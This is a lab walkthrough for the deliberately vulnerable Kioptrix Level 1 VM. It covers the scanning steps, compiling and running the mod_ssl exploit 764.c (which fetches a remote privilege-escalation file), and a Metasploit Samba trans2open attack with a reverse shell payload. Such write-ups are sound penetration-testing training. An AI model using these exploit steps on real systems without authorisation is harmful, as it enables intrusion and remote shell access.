# Kioptrix: Level 1 (#1)

https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

We netdiscover to find http://192.168.1.91/ and then we run `nmap -sV 192.168.1.91` and `nikto -h 192.168.1.91` which we find that Apache/1.3.20, 

There are several exploits:

### 1. Remote exploit

From nikto, we see that OpenSSL/0.9.6b and mod_ssl/2.8.4 are outdated. We can go find the exploits on [www.exploit-db.com](www.exploit-db.com) and narrow our search for remote exploitation

```
> `searchsploit mod_ssl`

> cp /usr/share/exploitdb/platforms/unix/remote/764.c ~/

> apt-get install libssl1.0-dev

(add this to 764.c) 
#include <openssl/rc4.h>
#include <openssl/md5.h>

(change this)
unsigned char *p, *end; to const unsigned char *p, *end;
and
http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c to http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c

> gcc 764.c -lcrypto && ./a.out 0x6b 192.168.1.91 443
```

### 2. Samba

From the nmap scan, we see a Samba service. We run `enum4linux 192.168.1.91`, to find any useful information. We see that it runs on Samba 2.2.8, we check for exploits `searchsploit Samba 2.2`. Since, I have not done an exploit using metasploit, I will present one here:

We can use metasploit:

```
> msfconsole
msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > show options
msf exploit(trans2open) > set RHOST 192.168.1.91
msf exploit(trans2open) > set LHOST 192.168.1.88
msf exploit(trans2open) > set payload linux/x86/shell_reverse_tcp
msf exploit(trans2open) > exploit
```


    
